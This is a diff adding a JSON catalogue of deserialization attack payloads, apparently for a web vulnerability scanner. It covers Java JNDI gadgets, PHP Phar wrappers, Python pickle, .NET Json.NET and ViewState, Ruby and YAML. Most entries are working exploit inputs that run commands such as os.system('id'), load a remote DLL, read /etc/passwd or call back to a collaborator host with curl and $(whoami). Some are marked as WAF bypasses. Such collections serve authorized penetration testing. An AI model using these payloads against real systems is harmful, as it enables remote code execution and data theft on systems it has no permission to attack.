@@ -1,0 +1,81 @@
+{
+  "category": "deserialization",
+  "contexts": {
+    "java_gadgets": {
+      "description": "Java deserialization gadget chain payloads (ysoserial-based)",
+      "payloads": [
+        {"payload": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "description": "Base64 Java serialized object prefix — probe for ObjectInputStream", "waf_bypass": false},
+        {"payload": "aced0005", "description": "Java serialization magic bytes (hex) — detect deserialization endpoints", "waf_bypass": false},
+        {"payload": "Content-Type: application/x-java-serialized-object", "description": "Content-Type header for Java serialized object", "waf_bypass": false},
+        {"payload": "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://COLLABORATOR/obj\",\"autoCommit\":true}", "description": "Fastjson JNDI lookup via JdbcRowSetImpl (CVE-2017-18349)", "waf_bypass": false},
+        {"payload": "{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://COLLABORATOR/obj\",\"autoCommit\":true}}", "description": "Fastjson nested JNDI bypass", "waf_bypass": true},
+        {"payload": "<java.util.PriorityQueue serialization='custom'><unserializable-parents/><java.util.PriorityQueue><default><size>2</size></default></java.util.PriorityQueue></java.util.PriorityQueue>", "description": "XStream PriorityQueue gadget (CVE-2021-21344)", "waf_bypass": false},
+        {"payload": "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: ldap://COLLABORATOR/obj, autoCommit: true}", "description": "SnakeYAML JNDI gadget via JdbcRowSetImpl", "waf_bypass": false},
+        {"payload": "{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://COLLABORATOR/obj\",\"autoCommit\":true}", "description": "Jackson polymorphic deserialization JNDI lookup", "waf_bypass": false}
+      ]
+    },
+    "php_phar": {
+      "description": "PHP deserialization and Phar archive exploitation payloads",
+      "payloads": [
+        {"payload": "O:8:\"stdClass\":0:{}", "description": "Minimal PHP serialized object — probe for unserialize()", "waf_bypass": false},
+        {"payload": "a:1:{s:4:\"test\";s:4:\"data\";}", "description": "PHP serialized array — probe for unserialize()", "waf_bypass": false},
+        {"payload": "O:8:\"stdClass\":1:{s:3:\"cmd\";s:2:\"id\";}", "description": "Serialized object with cmd property (needs __wakeup/__destruct gadget)", "waf_bypass": false},
+        {"payload": "phar:///var/www/html/uploads/avatar.jpg", "description": "Phar stream wrapper — triggers deserialization from uploaded file", "waf_bypass": false},
+        {"payload": "phar://./uploads/image.jpg/test.txt", "description": "Phar wrapper with relative path to uploaded archive", "waf_bypass": false},
+        {"payload": "O:7:\"CObject\":1:{s:4:\"file\";s:11:\"/etc/passwd\";}", "description": "File read gadget via common CObject pattern", "waf_bypass": false},
+        {"payload": "php://filter/read=convert.base64-decode/resource=phar://./data.phar", "description": "Chained PHP filters with Phar wrapper", "waf_bypass": true},
+        {"payload": "compress.zlib://phar:///tmp/upload.jpg", "description": "Phar via compress.zlib wrapper to bypass phar:// blocks", "waf_bypass": true}
+      ]
+    },
+    "python_pickle": {
+      "description": "Python deserialization payloads for unsafe object loading",
+      "payloads": [
+        {"payload": "gASVIAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==", "description": "Base64 serialized payload — os.system('id') via __reduce__", "waf_bypass": false},
+        {"payload": "cos\nsystem\n(S'id'\ntR.", "description": "Protocol 0 (text) — os.system('id')", "waf_bypass": false},
+        {"payload": "\\x80\\x04\\x95", "description": "Protocol 4 magic bytes — detection probe", "waf_bypass": false},
+        {"payload": "gASVLgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwSX19pbXBvcnRfXygnb3MnKZSFlFKULg==", "description": "Base64 serialized payload — builtins call for code execution", "waf_bypass": false},
+        {"payload": "(S'curl http://COLLABORATOR/$(whoami)'\nio\nsystem\n.", "description": "Protocol 0 — Collaborator callback with whoami", "waf_bypass": false},
+        {"payload": "gASVJwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAxzbGVlcCA1lIWUUpQu", "description": "Base64 serialized payload — os.system('sleep 5') for time-based detection", "waf_bypass": false},
+        {"payload": "\\x80\\x03cbuiltins\\ngetattr\\n(cbuiltins\\n__import__\\nX\\x02\\x00\\x00\\x00os\\x85R", "description": "Protocol 3 — getattr chain for import", "waf_bypass": true}
+      ]
+    },
+    "dotnet_viewstate": {
+      "description": ".NET ViewState and BinaryFormatter deserialization payloads",
+      "payloads": [
+        {"payload": "__VIEWSTATE=", "description": "Empty ViewState — probe for MAC validation", "waf_bypass": false},
+        {"payload": "__VIEWSTATE=AAAA&__VIEWSTATEGENERATOR=BBBB", "description": "Invalid ViewState — test error handling for stack trace leak", "waf_bypass": false},
+        {"payload": "__VIEWSTATE=/wEPDwUKLTEwNjMzMzQ5Ng9kFg==", "description": "Minimal valid ViewState — baseline comparison", "waf_bypass": false},
+        {"payload": "Content-Type: application/soap+xml", "description": "SOAP content type — probe for BinaryFormatter deserialization", "waf_bypass": false},
+        {"payload": "AAEAAAD/////", "description": "Base64 .NET BinaryFormatter magic prefix", "waf_bypass": false},
+        {"payload": "__VIEWSTATE=;__EVENTVALIDATION=", "description": "Empty ViewState with EventValidation — test MAC bypass", "waf_bypass": false},
+        {"payload": "{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\",\"MethodName\":\"Start\",\"ObjectInstance\":{\"$type\":\"System.Diagnostics.Process, System\"}}", "description": "Json.NET TypeNameHandling gadget — ObjectDataProvider", "waf_bypass": false},
+        {"payload": "{\"$type\":\"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install\",\"Path\":\"http://COLLABORATOR/payload.dll\"}", "description": "Json.NET remote assembly load via AssemblyInstaller", "waf_bypass": false}
+      ]
+    },
+    "ruby_marshal": {
+      "description": "Ruby Marshal.load deserialization payloads",
+      "payloads": [
+        {"payload": "\\x04\\x08", "description": "Ruby Marshal magic bytes — detection probe", "waf_bypass": false},
+        {"payload": "BAhvOhVBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6", "description": "Base64 Ruby ERB template gadget chain prefix", "waf_bypass": false},
+        {"payload": "---\n!ruby/object:Gem::Installer\ni: x\n", "description": "YAML Ruby object instantiation via Gem::Installer", "waf_bypass": false},
+        {"payload": "---\n!ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::DependencyList\n  specs:\n  - !ruby/object:Gem::Source\n    current_fetch_uri: http://COLLABORATOR", "description": "YAML gadget chain for SSRF via Gem::Source", "waf_bypass": false},
+        {"payload": "_session_id=BAhvOg1FeHBsb2l0Bw==--invalid", "description": "Tampered Rails session cookie — test MAC validation", "waf_bypass": false},
+        {"payload": "---\n!ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection\n? |", "description": "Rails named route collection gadget (CVE-2013-0156)", "waf_bypass": false},
+        {"payload": "Content-Type: application/x-yaml", "description": "YAML content type — probe for unsafe YAML.load", "waf_bypass": false}
+      ]
+    },
+    "yaml_unsafe": {
+      "description": "Unsafe YAML deserialization payloads across languages",
+      "payloads": [
+        {"payload": "!!python/object/apply:os.system ['id']", "description": "PyYAML RCE via !!python/object/apply (unsafe loader)", "waf_bypass": false},
+        {"payload": "!!python/object/new:subprocess.check_output [['id']]", "description": "PyYAML RCE via subprocess.check_output", "waf_bypass": false},
+        {"payload": "!!python/object/apply:subprocess.Popen\n- ['curl', 'http://COLLABORATOR']", "description": "PyYAML Collaborator callback via subprocess", "waf_bypass": false},
+        {"payload": "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://COLLABORATOR/\"]]]]", "description": "SnakeYAML ScriptEngineManager gadget (Java)", "waf_bypass": false},
+        {"payload": "!!com.sun.rowset.JdbcRowSetImpl\n  dataSourceName: ldap://COLLABORATOR/obj\n  autoCommit: true", "description": "SnakeYAML JNDI via JdbcRowSetImpl", "waf_bypass": false},
+        {"payload": "---\n!ruby/object:Gem::Installer\ni: x", "description": "Ruby YAML unsafe load — Gem::Installer instantiation", "waf_bypass": false},
+        {"payload": "{\"!!python/object/apply:os.system\": [\"sleep 5\"]}", "description": "PyYAML JSON-mode unsafe deserialization with sleep for time-based detection", "waf_bypass": false},
+        {"payload": "%TAG !python! tag:yaml.org,2002:python/\n---\n!python/object/apply:os.system ['id']", "description": "PyYAML with explicit TAG directive", "waf_bypass": true}
+      ]
+    }
+  }
+}
